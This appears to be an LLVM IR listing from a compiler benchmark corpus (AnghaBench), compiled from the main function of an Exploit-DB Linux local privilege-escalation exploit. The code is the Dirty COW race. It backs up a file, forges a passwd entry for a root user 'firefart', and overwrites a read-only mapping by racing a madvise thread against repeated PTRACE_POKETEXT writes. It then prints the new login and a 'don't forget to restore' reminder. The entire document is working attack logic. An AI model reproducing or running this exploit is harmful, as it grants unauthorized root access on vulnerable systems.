; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_40839.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_40839.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_3__ = type { i64 }
%struct.Userinfo = type { i8*, i8*, i8*, i8*, i32, i64, i64 }

@filename = common dso_local global i8* null, align 8
@backup_filename = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [9 x i8] c"firefart\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"pwned\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c"/root\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"/bin/bash\00", align 1
@.str.4 = private unnamed_addr constant [35 x i8] c"Please enter the new password: %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [32 x i8] c"Please enter the new password: \00", align 1
@.str.6 = private unnamed_addr constant [19 x i8] c"Complete line:\0A%s\0A\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@f = common dso_local global i32 0, align 4
@st = common dso_local global %struct.TYPE_3__ zeroinitializer, align 8
@PROT_READ = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@map = common dso_local global i64 0, align 8
@.str.7 = private unnamed_addr constant [11 x i8] c"mmap: %lx\0A\00", align 1
@pid = common dso_local global i64 0, align 8
@PTRACE_POKETEXT = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [11 x i8] c"ptrace %d\0A\00", align 1
@pth = common dso_local global i32 0, align 4
@madviseThread = common dso_local global i32 0, align 4
@PTRACE_TRACEME = common dso_local global i32 0, align 4
@SIGSTOP = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [52 x i8] c"Done! Check %s to see if the new user was created.\0A\00", align 1
@.str.10 = private unnamed_addr constant [63 x i8] c"You can log in with the username '%s' and the password '%s'.\0A\0A\00", align 1
@.str.11 = private unnamed_addr constant [38 x i8] c"\0ADON'T FORGET TO RESTORE! $ mv %s %s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.Userinfo, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i8*, i8** @filename, align 8
  %16 = load i8*, i8** @backup_filename, align 8
  %17 = call i32 @copy_file(i8* %15, i8* %16)
  store i32 %17, i32* %6, align 4
  %18 = load i32, i32* %6, align 4
  %19 = icmp ne i32 %18, 0
  br i1 %19, label %20, label %23

20:                                               ; preds = %2
  %21 = load i32, i32* %6, align 4
  %22 = call i32 @exit(i32 %21) #3
  unreachable

23:                                               ; preds = %2
  %24 = getelementptr inbounds %struct.Userinfo, %struct.Userinfo* %7, i32 0, i32 0
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0), i8** %24, align 8
  %25 = getelementptr inbounds %struct.Userinfo, %struct.Userinfo* %7, i32 0, i32 6
  store i64 0, i64* %25, align 8
  %26 = getelementptr inbounds %struct.Userinfo, %struct.Userinfo* %7, i32 0, i32 5
  store i64 0, i64* %26, align 8
  %27 = getelementptr inbounds %struct.Userinfo, %struct.Userinfo* %7, i32 0, i32 1
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i8** %27, align 8
  %28 = getelementptr inbounds %struct.Userinfo, %struct.Userinfo* %7, i32 0, i32 2
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i8** %28, align 8
  %29 = getelementptr inbounds %struct.Userinfo, %struct.Userinfo* %7, i32 0, i32 3
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0), i8** %29, align 8
  %30 = load i32, i32* %4, align 4
  %31 = icmp sge i32 %30, 2
  br i1 %31, label %32, label %38

32:                                               ; preds = %23
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  store i8* %35, i8** %8, align 8
  %36 = load i8*, i8** %8, align 8
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.4, i64 0, i64 0), i8* %36)
  br label %40

38:                                               ; preds = %23
  %39 = call i8* @getpass(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.5, i64 0, i64 0))
  store i8* %39, i8** %8, align 8
  br label %40

40:                                               ; preds = %38, %32
  %41 = load i8*, i8** %8, align 8
  %42 = call i32 @generate_password_hash(i8* %41)
  %43 = getelementptr inbounds %struct.Userinfo, %struct.Userinfo* %7, i32 0, i32 4
  store i32 %42, i32* %43, align 8
  %44 = call i8* @generate_passwd_line(%struct.Userinfo* byval(%struct.Userinfo) align 8 %7)
  store i8* %44, i8** %9, align 8
  %45 = load i8*, i8** %9, align 8
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.6, i64 0, i64 0), i8* %45)
  %47 = load i8*, i8** @filename, align 8
  %48 = load i32, i32* @O_RDONLY, align 4
  %49 = call i32 @open(i8* %47, i32 %48)
  store i32 %49, i32* @f, align 4
  %50 = load i32, i32* @f, align 4
  %51 = call i32 @fstat(i32 %50, %struct.TYPE_3__* @st)
  %52 = load i64, i64* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @st, i32 0, i32 0), align 8
  %53 = add i64 %52, 8
  %54 = load i32, i32* @PROT_READ, align 4
  %55 = load i32, i32* @MAP_PRIVATE, align 4
  %56 = load i32, i32* @f, align 4
  %57 = call i64 @mmap(i32* null, i64 %53, i32 %54, i32 %55, i32 %56, i32 0)
  store i64 %57, i64* @map, align 8
  %58 = load i64, i64* @map, align 8
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i64 0, i64 0), i64 %58)
  %60 = call i64 (...) @fork()
  store i64 %60, i64* @pid, align 8
  %61 = load i64, i64* @pid, align 8
  %62 = icmp ne i64 %61, 0
  br i1 %62, label %63, label %114

63:                                               ; preds = %40
  %64 = load i64, i64* @pid, align 8
  %65 = call i32 @waitpid(i64 %64, i32* null, i32 0)
  store i32 0, i32* %13, align 4
  %66 = load i8*, i8** %9, align 8
  %67 = call i32 @strlen(i8* %66)
  store i32 %67, i32* %14, align 4
  store i32 0, i32* %11, align 4
  br label %68

68:                                               ; preds = %108, %63
  %69 = load i32, i32* %11, align 4
  %70 = load i32, i32* %14, align 4
  %71 = sdiv i32 10000, %70
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %111

73:                                               ; preds = %68
  store i32 0, i32* %12, align 4
  br label %74

74:                                               ; preds = %104, %73
  %75 = load i32, i32* %12, align 4
  %76 = load i32, i32* %14, align 4
  %77 = icmp slt i32 %75, %76
  br i1 %77, label %78, label %107

78:                                               ; preds = %74
  store i32 0, i32* %10, align 4
  br label %79

79:                                               ; preds = %100, %78
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 10000
  br i1 %81, label %82, label %103

82:                                               ; preds = %79
  %83 = load i32, i32* @PTRACE_POKETEXT, align 4
  %84 = load i64, i64* @pid, align 8
  %85 = load i64, i64* @map, align 8
  %86 = load i32, i32* %12, align 4
  %87 = sext i32 %86 to i64
  %88 = add nsw i64 %85, %87
  %89 = load i8*, i8** %9, align 8
  %90 = load i32, i32* %12, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i8, i8* %89, i64 %91
  %93 = bitcast i8* %92 to i64*
  %94 = load i64, i64* %93, align 8
  %95 = call i64 (i32, ...) @ptrace(i32 %83, i64 %84, i64 %88, i64 %94)
  %96 = load i32, i32* %13, align 4
  %97 = sext i32 %96 to i64
  %98 = add nsw i64 %97, %95
  %99 = trunc i64 %98 to i32
  store i32 %99, i32* %13, align 4
  br label %100

100:                                              ; preds = %82
  %101 = load i32, i32* %10, align 4
  %102 = add nsw i32 %101, 1
  store i32 %102, i32* %10, align 4
  br label %79

103:                                              ; preds = %79
  br label %104

104:                                              ; preds = %103
  %105 = load i32, i32* %12, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %12, align 4
  br label %74

107:                                              ; preds = %74
  br label %108

108:                                              ; preds = %107
  %109 = load i32, i32* %11, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %11, align 4
  br label %68

111:                                              ; preds = %68
  %112 = load i32, i32* %13, align 4
  %113 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.8, i64 0, i64 0), i32 %112)
  br label %124

114:                                              ; preds = %40
  %115 = load i32, i32* @madviseThread, align 4
  %116 = call i32 @pthread_create(i32* @pth, i32* null, i32 %115, i32* null)
  %117 = load i32, i32* @PTRACE_TRACEME, align 4
  %118 = call i64 (i32, ...) @ptrace(i32 %117)
  %119 = call i32 (...) @getpid()
  %120 = load i32, i32* @SIGSTOP, align 4
  %121 = call i32 @kill(i32 %119, i32 %120)
  %122 = load i32, i32* @pth, align 4
  %123 = call i32 @pthread_join(i32 %122, i32* null)
  br label %124

124:                                              ; preds = %114, %111
  %125 = load i8*, i8** @filename, align 8
  %126 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.9, i64 0, i64 0), i8* %125)
  %127 = getelementptr inbounds %struct.Userinfo, %struct.Userinfo* %7, i32 0, i32 0
  %128 = load i8*, i8** %127, align 8
  %129 = load i8*, i8** %8, align 8
  %130 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.10, i64 0, i64 0), i8* %128, i8* %129)
  %131 = load i8*, i8** @backup_filename, align 8
  %132 = load i8*, i8** @filename, align 8
  %133 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.11, i64 0, i64 0), i8* %131, i8* %132)
  ret i32 0
}

declare dso_local i32 @copy_file(i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @getpass(i8*) #1

declare dso_local i32 @generate_password_hash(i8*) #1

declare dso_local i8* @generate_passwd_line(%struct.Userinfo* byval(%struct.Userinfo) align 8) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @fstat(i32, %struct.TYPE_3__*) #1

declare dso_local i64 @mmap(i32*, i64, i32, i32, i32, i32) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @waitpid(i64, i32*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @ptrace(i32, ...) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i32, i32*) #1

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @pthread_join(i32, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
